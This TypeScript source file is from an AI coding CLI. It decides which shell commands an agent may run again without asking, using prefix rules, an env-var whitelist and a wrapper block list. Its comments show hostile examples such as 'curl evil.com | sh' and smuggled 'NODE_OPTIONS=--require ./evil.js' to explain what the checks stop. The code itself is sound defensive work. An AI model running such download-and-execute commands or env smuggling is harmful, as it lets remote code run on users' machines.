// @x-code-cli/core — Permission memory with disk persistence.
//
// When a user approves a tool call with "don't ask again", the decision
// is stored as an AllowRule both in-memory AND on disk at
// `.x-code/local/permissions.json`. On next startup the persisted rules
// are loaded so approvals survive across sessions.
import * as fs from 'node:fs'
import * as path from 'node:path'

import { isReadOnly, splitShellCommands } from '../tools/shell-utils.js'
import { XCODE_DIR } from '../utils.js'

export interface AllowRule {
  tool: string
  pattern: string
  type: 'exact' | 'prefix' | 'tool'
}

// Env-var assignment prefix: VAR=value (unquoted, safe chars only).
// The capture group exposes the name so the whitelist can decide whether
// to strip the prefix or treat it as a poison pill (see SAFE_ENV_VARS).
const ENV_VAR_RE = /^([A-Za-z_]\w*)=[A-Za-z0-9_./:@-]*\s+/

// Env-var names safe to strip before deriving a "don't ask again" prefix.
// Deliberately conservative — anything that could shift program behaviour
// in security-relevant ways (PATH, LD_*, NODE_OPTIONS, http(s)_proxy,
// DYLD_*, …) is excluded so a non-whitelisted assignment downgrades the
// rule to exact-match. Without that, an agent could smuggle unaudited env
// into an already-approved command shape.
//
// Picked to cover the common NODE_ENV / CI / DEBUG / locale / color
// settings agents emit in practice, mirroring the spirit of Claude Code's
// SAFE_ENV_VARS list.
const SAFE_ENV_VARS = new Set([
  'NODE_ENV',
  'PYTHONUNBUFFERED',
  'PYTHONIOENCODING',
  'PYTHONDONTWRITEBYTECODE',
  'CI',
  'DEBUG',
  'FORCE_COLOR',
  'NO_COLOR',
  'CLICOLOR',
  'CLICOLOR_FORCE',
  'TERM',
  'COLORTERM',
  'LANG',
  'LC_ALL',
  'LC_CTYPE',
  'LC_MESSAGES',
  'LC_TIME',
  'LC_COLLATE',
  'TZ',
  'EDITOR',
  'VISUAL',
  'PAGER',
  'LESS',
])

// First-token wrappers too broad to anchor a "don't ask again" rule on.
// `sudo ls` once approved must NOT auto-approve `sudo <anything>`, and we
// don't (yet) crack open `bash -c "<inner>"` to re-extract — so for these
// we return null and force exact-match. `sudo` is also caught upstream by
// isDestructive(); listed here for defence-in-depth.
const WRAPPER_BLOCKLIST = new Set([
  'sudo',
  'doas',
  'su',
  'bash',
  'sh',
  'zsh',
  'fish',
  'dash',
  'ksh',
  'cmd',
  'env',
  'time',
  'nice',
  'ionice',
  'timeout',
  'nohup',
  'xargs',
  'watch',
  'parallel',
  'exec',
  'eval',
])

// Per-command global-flag tables: tokens between `cmd` and its real
// subcommand. Without these, `git -C /tmp commit` would extract `git -C`
// and miss every prefix rule the user has for `git commit`.
//
// `valued` flags consume the following token; everything else starting
// with `-` is treated as a boolean flag (skip one). `--name=value` is
// detected by the embedded `=`. `cargo +toolchain` is the one non-flag
// token kind that needs skipping; gated by `takesPlus`.
const GLOBAL_FLAGS: Record<string, { valued: Set<string>; takesPlus?: boolean }> = {
  git: {
    valued: new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--exec-path', '--super-prefix']),
  },
  docker: {
    valued: new Set([
      '-H',
      '--host',
      '--config',
      '--context',
      '-c',
      '--log-level',
      '--tlscacert',
      '--tlscert',
      '--tlskey',
    ]),
  },
  podman: {
    valued: new Set(['--connection', '-c', '--log-level', '--root', '--runroot', '--storage-driver', '--url']),
  },
  kubectl: {
    valued: new Set([
      '-n',
      '--namespace',
      '--context',
      '--cluster',
      '--kubeconfig',
      '--server',
      '-s',
      '--user',
      '--token',
      '--as',
      '--as-group',
      '--cache-dir',
      '--certificate-authority',
      '--client-certificate',
      '--client-key',
    ]),
  },
  cargo: {
    valued: new Set(['--config', '-Z', '--color', '--manifest-path']),
    takesPlus: true,
  },
}

// Subcommand-name shape: lowercase letter, then [a-z0-9-]. Hyphens only
// internal (no trailing dash). Filters out `-flag`, `/flag`, and paths.
const SUBCOMMAND_RE = /^[a-z][a-z0-9]*(-[a-z0-9]+)*$/

// PowerShell Verb-Noun cmdlet shape: `Get-ChildItem`, `Sort-Object`,
// `Invoke-WebRequest`, … One Verb segment (initial-cap + lowercase),
// then ≥1 Noun segments separated by `-`. Each Noun must also start
// with a capital letter so we don't accept `git-foo` (Unix-style command
// with a dash) — those should keep going through the POSIX subcommand
// path. The whole token is the prefix on its own: cmdlets take
// `-Parameter Value` arguments, not subcommands.
const VERB_NOUN_CMDLET_RE = /^[A-Z][a-z]+(?:-[A-Z][A-Za-z0-9]*)+$/

// Compound-segment heads we treat as setup-only (a directory change
// preceding the "real" command). Approving `cd D:\foo && npm test`
// should anchor on `npm test`, not on the literal cd. Matches both
// POSIX (`cd`, `pushd`, `popd`, `chdir`) and PowerShell (`Set-Location`,
// `Push-Location`, `Pop-Location` plus their `sl`/`pushd`/`popd`
// aliases). Case-insensitive because PowerShell is.
const CD_LIKE_RE = /^(?:cd|chdir|pushd|popd|set-location|push-location|pop-location|sl)\b/i

// Detects the `powershell` / `powershell.exe` / `pwsh` invocation prefix.
// We don't try to match the WHOLE shape here — agents use a lot of flag
// variations (`-NoProfile`, `-ExecutionPolicy Bypass`, `-File foo.ps1`,
// bare invocation without `-Command`). Just identify the launcher; the
// extractor below scans past flags to find the inner command.
const POWERSHELL_LAUNCHER_RE = /^(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i

// Extracts the first cmdlet or command name from inside quoted PowerShell.
// Handles Verb-Noun cmdlets (Get-Process) and plain commands (git, npm).
const PS_INNER_CMD_RE = /["']?\s*(?:&\s*\{?\s*)?([A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+|[a-z][a-z0-9._-]*)/

/**
 * Extract a command prefix suitable for prefix-match rules.
 * Returns `null` when no meaningful prefix can be safely derived —
 * callers fall back to exact-match.
 *
 *   'git commit -m "fix"'                                    → 'git commit'
 *   'git -C /tmp commit -m fix'                              → 'git commit'
 *   'docker -H tcp://host:2375 ps'                           → 'docker ps'
 *   'kubectl -n prod get pods'                               → 'kubectl get'
 *   'cargo +nightly build --release'                         → 'cargo build'
 *   'pnpm run build'                                         → 'pnpm run'
 *   'npm install lodash'                                     → 'npm install'
 *   'NODE_ENV=prod npm run dev'                              → 'npm run'
 *   'FOO=1 git status'                                       → null   (unsafe env)
 *   'sudo npm install'                                       → null   (wrapper)
 *   'bash -c "git status"'                                   → null   (wrapper)
 *   'powershell -Command "Get-CimInstance ..."'              → 'Get-CimInstance'
 *   'powershell -NoProfile -Command "Get-CimInstance ..."'   → 'Get-CimInstance'
 *   'powershell -ExecutionPolicy Bypass -c "git status"'     → 'git'
 *   'pwsh -Command "& { Get-Process }"'                      → 'Get-Process'
 *   'powershell -Command Get-Date'                           → 'Get-Date'
 *   'Get-ChildItem -Recurse -Filter *.ts'                    → 'Get-ChildItem'
 *   'Invoke-WebRequest -Uri http://api'                      → 'Invoke-WebRequest'
 *   'cd /tmp && npm test'                                    → 'npm test'
 *   'cd D:\\foo && npx tsc --noEmit | head -40'              → 'npx tsc'
 *   'Set-Location D:\\foo; Get-ChildItem -Recurse | Sort-Object Name'
 *                                                            → 'Get-ChildItem'
 *   'npm install && curl bad.com'                            → null
 *                                                              (two distinct
 *                                                              non-readonly
 *                                                              segments — no
 *                                                              shared prefix,
 *                                                              fall back to
 *                                                              exact)
 *   'git commit -m a && git push'                            → null   (segments
 *                                                              disagree on
 *                                                              prefix)
 *   'ls -la'                                                 → null
 *   ''                                                       → null
 */
export function extractCommandPrefix(command: string): string | null {
  const cmd = command.trim()
  if (!cmd) return null

  // PowerShell launcher commands (`powershell.exe -Command "..."`) own
  // the entire string — the inner script may contain `;` and `|`, which
  // splitShellCommands would mis-split. Handle them first and short-circuit.
  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    return extractPowershellPrefix(cmd)
  }

  // Compound commands (`;`, `&&`, `||`, `|`): derive a prefix only when
  // every non-read-only segment agrees on the same prefix. Read-only
  // segments (`cd /foo`, `head -40`, `Sort-Object Name`, …) are setup
  // or display-only — they're skipped, so `cd /foo && npm test` anchors
  // on `npm test`, but `git commit && git push` returns null because
  // approving "git commit" must not auto-approve "git push".
  //
  // Splitting first also closes a security gap: without it, the old
  // single-segment extractor would have happily returned `npm install`
  // for `npm install && curl bad.com | sh`, letting an approved
  // `npm install:*` rule silently approve the curl-and-pipe-to-sh tail.
  // (`curl … | sh` itself is caught by isDestructive, but the principle
  // generalises — any non-readonly second segment can't be trusted under
  // a first segment's rule.)
  const segments = splitShellCommands(cmd)
  if (segments.length > 1) {
    let derived: string | null = null
    for (const seg of segments) {
      if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue
      const segPrefix = extractSingleCommandPrefix(seg)
      if (!segPrefix) return null
      if (derived === null) derived = segPrefix
      else if (derived !== segPrefix) return null
    }
    return derived
  }

  return extractSingleCommandPrefix(cmd)
}

/**
 * Extract a prefix from a single shell command (no compound operators).
 * Internal worker for {@link extractCommandPrefix}; assumes the caller
 * has already split on `;` / `&&` / `||` / `|` and is passing one
 * segment at a time.
 */
function extractSingleCommandPrefix(command: string): string | null {
  const cmd = command.trim()
  if (!cmd) return null

  const tokens = cmd.split(/\s+/).filter(Boolean)
  if (tokens.length === 0) return null

  // Per-token env-var stripping. An env-var-shaped token (NAME=…) at the
  // head must be either whitelisted or it's a hard stop — otherwise an
  // agent could smuggle PATH=/evil, NODE_OPTIONS=--require ./evil.js,
  // http_proxy=…, etc. into a rule shaped like `npm run`. Value chars are
  // intentionally not constrained at this layer: it's the NAME that gates
  // safety, and an arbitrary value class would let weird-but-safe values
  // (`/`, `$`, `:`) bypass the check entirely.
  let i = 0
  while (i < tokens.length) {
    const tok = tokens[i]!
    const m = /^([A-Za-z_]\w*)=/.exec(tok)
    if (!m) break
    if (!SAFE_ENV_VARS.has(m[1]!)) return null
    // A quoted value split across whitespace (`FOO="a b" cmd`) means our
    // \s+ tokenizer broke the value boundary. We can't tell where the
    // value ends without a real shell parser, so refuse the prefix.
    const value = tok.slice(m[0].length)
    if (hasUnclosedQuote(value)) return null
    i++
  }

  const rest = tokens.slice(i)
  if (rest.length === 0) return null

  // PowerShell cmdlets (Verb-Noun like `Get-ChildItem`) are their own
  // prefix: cmdlets don't have subcommands the way `git`/`docker` do,
  // they take `-Parameter` arguments. The previous code was waiting for
  // a SUBCOMMAND_RE-shaped second token and silently returning null on
  // anything like `Get-ChildItem -Recurse …`. Recognise the cmdlet
  // shape and return it directly. This deliberately runs BEFORE the
  // `rest.length < 2` gate so a bare `Get-Process` is also a valid
  // prefix (single-cmdlet rules like `Get-ChildItem:*` are the analogue
  // of `git status:*` for the PowerShell side).
  if (VERB_NOUN_CMDLET_RE.test(rest[0]!)) {
    return rest[0]!
  }

  if (rest.length < 2) return null

  const firstLower = rest[0]!.toLowerCase()
  if (WRAPPER_BLOCKLIST.has(firstLower)) return null

  const subIdx = skipGlobalFlags(rest, firstLower)
  if (subIdx >= rest.length) return null

  const sub = rest[subIdx]!
  if (!SUBCOMMAND_RE.test(sub)) return null

  return `${rest[0]} ${sub}`
}

function hasUnclosedQuote(s: string): boolean {
  let sq = 0
  let dq = 0
  for (const ch of s) {
    if (ch === "'") sq++
    else if (ch === '"') dq++
  }
  return sq % 2 === 1 || dq % 2 === 1
}

function skipGlobalFlags(tokens: string[], firstLower: string): number {
  const cfg = GLOBAL_FLAGS[firstLower]
  if (!cfg) return 1
  let i = 1
  while (i < tokens.length) {
    const tok = tokens[i]!
    if (cfg.takesPlus && tok.startsWith('+')) {
      i++
      continue
    }
    if (!tok.startsWith('-')) break
    // --flag=value: single token, advance once.
    if (tok.includes('=')) {
      i++
      continue
    }
    if (cfg.valued.has(tok)) {
      i += 2
      continue
    }
    // Unknown boolean-style flag — best-effort skip. Erring toward "find
    // the subcommand" matches what users see at the CLI.
    i++
  }
  return i
}

function extractPowershellPrefix(cmd: string): string | null {
  const tokens = cmd.split(/\s+/).filter(Boolean)
  let i = 1 // skip launcher
  while (i < tokens.length) {
    const tok = tokens[i]!
    if (!tok.startsWith('-')) break
    const lower = tok.toLowerCase()
    if (lower === '-command' || lower === '-c') {
      i++
      break
    }
    if (lower === '-file') return null
    if (
      lower === '-executionpolicy' ||
      lower === '-encodedcommand' ||
      lower === '-inputformat' ||
      lower === '-outputformat' ||
      lower === '-version' ||
      lower === '-windowstyle' ||
      lower === '-configurationname' ||
      lower === '-mta' ||
      lower === '-sta'
    ) {
      i += 2
      continue
    }
    i++
  }
  if (i >= tokens.length) return null
  const inner = tokens.slice(i).join(' ')
  const m = PS_INNER_CMD_RE.exec(inner)
  return m?.[1] ?? null
}

/**
 * Like {@link extractCommandPrefix} but for compound commands returns the
 * full set of distinct prefixes — one per non-read-only, non-cd segment.
 *
 * Returns `null` if any non-read-only segment has no derivable prefix
 * (the caller has a richer fallback via {@link extractCompoundRules} now)
 * or if every segment was filtered out as read-only / cd-like (mostly
 * defensive — those auto-allow upstream).
 *
 * Kept exported for compatibility with consumers that only need the
 * prefix list — current internal callers use the richer
 * {@link extractCompoundRules}.
 */
export function extractCompoundPrefixes(command: string): string[] | null {
  const cmd = command.trim()
  if (!cmd) return null

  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    const p = extractPowershellPrefix(cmd)
    return p ? [p] : null
  }

  const segments = splitShellCommands(cmd)
  if (segments.length === 0) return null

  const seen = new Set<string>()
  const out: string[] = []
  for (const seg of segments) {
    if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue
    const p = extractSingleCommandPrefix(seg)
    if (!p) return null
    if (!seen.has(p)) {
      seen.add(p)
      out.push(p)
    }
  }
  return out.length === 0 ? null : out
}

/**
 * Per-segment rule extraction for compound commands. Returns one rule
 * per non-read-only, non-cd segment:
 *   - prefix rule when the segment has a derivable prefix (e.g.
 *     `git commit -m foo` → `{ type: 'prefix', pattern: 'git commit' }`)
 *   - segment-level exact rule otherwise (e.g. `curl evil.com` →
 *     `{ type: 'exact', pattern: 'curl evil.com' }`)
 *
 * The mix is the point: `git commit && curl evil.com` was previously
 * collapsing to a single full-command exact-match because `curl evil.com`
 * has no prefix, throwing away the perfectly-derivable `git commit:*`.
 * The label now reads `git commit:*, curl evil.com` and one click saves
 * both rules. The matcher accepts an exact rule either against the full
 * command (legacy) or against any non-readonly segment, so future
 * `cd /tmp && git commit -m b && curl evil.com` auto-approves cleanly.
 *
 * Returns `null` if no segment yielded a rule (all-readonly compounds —
 * auto-allowed upstream, never reaches us in practice) or if we hit a
 * non-whitelisted env-var prefix that disqualifies the segment (same
 * security gate as the single-cmd path).
 */
export function extractCompoundRules(command: string): AllowRule[] | null {
  const cmd = command.trim()
  if (!cmd) return null

  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    const p = extractPowershellPrefix(cmd)
    return p ? [{ tool: 'shell', pattern: p, type: 'prefix' }] : null
  }

  const segments = splitShellCommands(cmd)
  if (segments.length === 0) return null

  const seen = new Set<string>()
  const out: AllowRule[] = []

  for (const seg of segments) {
    const trimmed = seg.trim()
    if (isReadOnly(trimmed) || CD_LIKE_RE.test(trimmed)) continue

    const prefix = extractSingleCommandPrefix(trimmed)
    if (prefix) {
      const key = `prefix:${prefix}`
      if (!seen.has(key)) {
        seen.add(key)
        out.push({ tool: 'shell', pattern: prefix, type: 'prefix' })
      }
      continue
    }

    // No prefix — fall back to a segment-level exact rule. Strip safe
    // env-vars so the matcher key stays canonical; reject if a
    // non-whitelisted env-var assignment is present (same posture as
    // extractSingleCommandPrefix).
    const headEnv = /^([A-Za-z_]\w*)=/.exec(trimmed)
    if (headEnv && !SAFE_ENV_VARS.has(headEnv[1]!)) return null
    const exact = stripSafeEnvVars(trimmed)
    if (!exact) return null
    const key = `exact:${exact}`
    if (!seen.has(key)) {
      seen.add(key)
      out.push({ tool: 'shell', pattern: exact, type: 'exact' })
    }
  }

  return out.length === 0 ? null : out
}

/**
 * Generate the display label for the "don't ask again" option.
 * Returns `null` only for tools where a "don't ask again" affordance
 * makes no sense (enterPlanMode toggles a mode, not a recurring action).
 *
 * Shell, single derivable prefix:   `git commit:*`
 * Shell, multiple derivable prefixes (compound where segments disagree
 *   — e.g. `git commit && git push`):  `git commit:*, git push:*`
 *   — the click saves BOTH rules so subsequent compound invocations
 *   stop prompting.
 * Shell, no derivable prefix:       `this exact command` (exact-match
 *   rule — covers Windows-style commands like `findstr /n …`, `cmd /c …`,
 *   `dir /b`, where the second token is a `/flag` or path that fails
 *   the prefix regex; without this fallback the user gets only Yes/No
 *   forever for repeated identical commands).
 * Write tools (writeFile / edit): `all edits this session` (session-only)
 * MCP tools (isMcp=true):         `this MCP tool` (persisted to disk via
 *   McpPermissionStore — the label matches that posture, unlike write
 *   tools which fall back to session-only).
 */
export function suggestRuleLabel(toolName: string, input: Record<string, unknown>, isMcp = false): string | null {
  if (toolName === 'enterPlanMode') return null
  if (isMcp) return 'this MCP tool'
  if (toolName === 'shell') {
    const cmd = (input.command as string) ?? ''
    const rules = extractCompoundRules(cmd)
    if (!rules || rules.length === 0) return 'this exact command'
    // Single rule whose exact pattern equals the full command → keep
    // the legacy concise label rather than echoing the command back at
    // the user. That preserves the readable "this exact command" wording
    // for `findstr /n …` / `cmd /c …` invocations that have no derivable
    // prefix at all.
    if (rules.length === 1) {
      const r = rules[0]!
      if (r.type === 'exact' && r.pattern === stripSafeEnvVars(cmd)) return 'this exact command'
    }
    return rules.map((r) => (r.type === 'prefix' ? `${r.pattern}:*` : r.pattern)).join(', ')
  }
  return 'all edits this session'
}

/**
 * Build the AllowRule(s) for a "don't ask again" approval.
 *
 * - Shell with derivable prefix(es) → one prefix rule per distinct
 *   non-read-only segment. `git commit && git push` saves BOTH
 *   `git commit:*` and `git push:*` on a single click (matching the
 *   compound label shown to the user). Persisted to disk.
 * - Shell without derivable prefix  → single exact-match rule, persisted
 *   (mirrors Claude Code's `suggestionForExactCommand` fallback in
 *   `bashPermissions.ts`). Less reusable than a prefix rule (any arg
 *   change breaks the match) but at least suppresses repeated identical
 *   invocations — better than "Yes/No forever". The matcher compares
 *   against `stripEnvVars(cmd)` so leading `NODE_ENV=…` etc. don't defeat
 *   the rule.
 * - writeFile / edit  → single tool-wide allow, session-only (matches
 *   Claude Code).
 *
 * `persist` indicates whether the rules should be saved to disk. Write
 * tools return persist=false; everything else returns persist=true.
 * Returns `null` only for the very few cases where no rule shape applies
 * (currently nothing — kept in the signature so callers stay defensive).
 */
export function buildAllowRule(
  toolName: string,
  input: Record<string, unknown>,
): { rules: AllowRule[]; persist: boolean } | null {
  if (toolName === 'shell') {
    const cmd = (input.command as string) ?? ''
    const rules = extractCompoundRules(cmd)
    if (rules && rules.length > 0) {
      return { rules, persist: true }
    }
    // Strip *safe* env-var prefixes only — same key the matcher compares
    // against (stripSafeEnvVars). Non-whitelisted assignments stay in the
    // pattern so an approval for `BACKDOOR=1 findstr …` doesn't
    // accidentally auto-allow `findstr …` on its own.
    const exact = stripSafeEnvVars(cmd)
    if (!exact) return null
    return { rules: [{ tool: toolName, pattern: exact, type: 'exact' }], persist: true }
  }
  return { rules: [{ tool: toolName, pattern: '*', type: 'tool' }], persist: false }
}

function stripSafeEnvVars(command: string): string {
  let cmd = command.trim()
  while (true) {
    const m = ENV_VAR_RE.exec(cmd)
    if (!m) break
    if (!SAFE_ENV_VARS.has(m[1]!)) break
    cmd = cmd.slice(m[0].length)
  }
  return cmd.trim()
}

// ─── Serialization helpers ───

function ruleToString(rule: AllowRule): string {
  if (rule.type === 'tool') return `${rule.tool}:*`
  if (rule.type === 'prefix') return `${rule.tool}:${rule.pattern}:*`
  return `${rule.tool}:=${rule.pattern}`
}

function parseRuleString(s: string): AllowRule | null {
  // tool:*  → tool-wide
  const toolWide = s.match(/^([^:]+):\*$/)
  if (toolWide) return { tool: toolWide[1]!, pattern: '*', type: 'tool' }
  // tool:prefix:*  → prefix match
  const prefix = s.match(/^([^:]+):(.+):\*$/)
  if (prefix) return { tool: prefix[1]!, pattern: prefix[2]!, type: 'prefix' }
  // tool:=exact  → exact match
  const exact = s.match(/^([^:]+):=(.+)$/)
  if (exact) return { tool: exact[1]!, pattern: exact[2]!, type: 'exact' }
  return null
}

function getPermissionsPath(cwd: string): string {
  return path.join(cwd, XCODE_DIR, 'local', 'permissions.json')
}

// ─── Store ───

class SessionPermissionStore {
  private rules: AllowRule[] = []

  addRule(rule: AllowRule): void {
    const exists = this.rules.some((r) => r.tool === rule.tool && r.pattern === rule.pattern && r.type === rule.type)
    if (!exists) this.rules.push(rule)
  }

  matches(toolName: string, input: Record<string, unknown>): boolean {
    if (toolName !== 'shell') {
      // Non-shell tools: tool-wide allow is the only rule shape we
      // currently emit. Exact / prefix are shell-only.
      for (const rule of this.rules) {
        if (rule.tool !== toolName) continue
        if (rule.type === 'tool') return true
      }
      return false
    }

    const cmd = (input.command as string) ?? ''

    // First pass: tool-wide and exact rules operate on the full command
    // string. (A user could in principle approve a destructive command
    // exactly; we honour that.)
    for (const rule of this.rules) {
      if (rule.tool !== toolName) continue
      if (rule.type === 'tool') return true
      if (rule.type === 'exact' && stripSafeEnvVars(cmd) === rule.pattern) return true
    }

    // Second pass: compound-aware prefix matching. Every non-read-only,
    // non-cd-like segment of the command must individually match at
    // least one persisted prefix rule. This is what lets a single click
    // on `git commit && git push` save BOTH prefixes and have future
    // `git commit -m foo && git push origin main` auto-approve.
    //
    // The "every segment must match" rule is the security gate: if a
    // user has only ever approved `git commit:*`, a later
    // `git commit -m a && curl evil.com | sh` still asks — `curl` has
    // no matching rule. (The `| sh` is also caught by isDestructive
    // upstream; the principle generalises beyond that one pattern.)
    const segments = splitShellCommands(cmd)
    const checkable = segments.filter((seg) => !isReadOnly(seg) && !CD_LIKE_RE.test(seg.trim()))
    if (checkable.length === 0) return false

    for (const seg of checkable) {
      const segText = stripSafeEnvVars(seg.trim())
      const segPrefix = extractSingleCommandPrefix(seg)
      let segMatched = false
      for (const rule of this.rules) {
        if (rule.tool !== toolName) continue
        if (rule.type === 'prefix' && segPrefix) {
          if (segPrefix === rule.pattern || segPrefix.startsWith(rule.pattern + ' ')) {
            segMatched = true
            break
          }
        } else if (rule.type === 'exact' && segText === rule.pattern) {
          // Per-segment exact: covers the `curl evil.com` half of a
          // mixed compound rule set. The full-cmd exact-match check
          // above already handled the legacy "approved the whole
          // compound verbatim" case.
          segMatched = true
          break
        }
      }
      if (!segMatched) return false
    }
    return true
  }

  clear(): void {
    this.rules = []
  }

  get size(): number {
    return this.rules.length
  }
}

const store = new SessionPermissionStore()

export function addSessionAllowRule(rule: AllowRule): void {
  store.addRule(rule)
}

export function sessionRulesMatch(toolName: string, input: Record<string, unknown>): boolean {
  return store.matches(toolName, input)
}

export function clearSessionRules(): void {
  store.clear()
}

// ─── Disk persistence ───

/**
 * Load persisted permission rules from `.x-code/local/permissions.json`
 * into the in-memory store. Safe to call multiple times (deduplicates).
 * Silently no-ops if the file doesn't exist or is malformed.
 */
export function loadPersistedRules(cwd: string): void {
  const filePath = getPermissionsPath(cwd)
  let raw: string
  try {
    raw = fs.readFileSync(filePath, 'utf-8')
  } catch {
    return
  }
  let data: { allow?: string[] }
  try {
    data = JSON.parse(raw) as { allow?: string[] }
  } catch {
    return
  }
  if (!Array.isArray(data.allow)) return
  for (const entry of data.allow) {
    if (typeof entry !== 'string') continue
    const rule = parseRuleString(entry)
    if (rule) store.addRule(rule)
  }
}

/**
 * Persist a new rule to `.x-code/local/permissions.json`.
 * Creates the file if it doesn't exist. Appends without duplicating.
 */
export function persistRule(cwd: string, rule: AllowRule): void {
  const filePath = getPermissionsPath(cwd)
  const ruleStr = ruleToString(rule)

  const data: { allow: string[] } = { allow: [] }
  try {
    const raw = fs.readFileSync(filePath, 'utf-8')
    const parsed = JSON.parse(raw) as { allow?: string[] }
    if (Array.isArray(parsed.allow)) {
      data.allow = parsed.allow.filter((s): s is string => typeof s === 'string')
    }
  } catch {
    // File doesn't exist or is malformed — start fresh.
  }

  if (data.allow.includes(ruleStr)) return

  data.allow.push(ruleStr)

  const dir = path.dirname(filePath)
  fs.mkdirSync(dir, { recursive: true })
  // Self-protect .x-code/local/ — permissions.json records auto-approved
  // shell-command patterns specific to this user's threat tolerance and
  // shouldn't leak into git history. Drop a `*` .gitignore on first write
  // so the directory is safe even when the user's project hasn't gitignored
  // .x-code/ as a whole.
  const gitignorePath = path.join(dir, '.gitignore')
  if (!fs.existsSync(gitignorePath)) {
    fs.writeFileSync(gitignorePath, '*\n', 'utf-8')
  }
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2) + '\n', 'utf-8')
}
